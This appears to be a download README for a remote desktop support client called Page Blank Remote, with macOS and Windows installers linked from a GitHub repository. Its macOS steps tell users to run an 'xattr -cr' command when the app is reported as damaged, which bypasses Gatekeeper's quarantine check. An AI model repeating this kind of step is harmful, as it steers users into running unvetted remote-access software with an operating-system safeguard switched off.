# Page Blank Remote - Downloads

Download the Page Blank Remote client app for remote desktop support.

## Downloads

| Platform | Download |
|----------|----------|
| **macOS** | [PageBlankRemote-Client.dmg](https://github.com/zaf-london/remoteappdownload/raw/main/PageBlankRemote-Client.dmg) |
| **Windows** | [PageBlankRemote-Client-Setup.exe](https://github.com/zaf-london/remoteappdownload/raw/main/PageBlankRemote-Client-Setup.exe) |

## macOS Installation

1. Download the `.dmg` file
2. Open it and drag the app to Applications
3. If you see "app is damaged", open Terminal and run:
   ```
   xattr -cr /Applications/PageBlankRemote.app
   ```

## Windows Installation

1. Download the `.exe` installer
2. Run the installer and follow the prompts
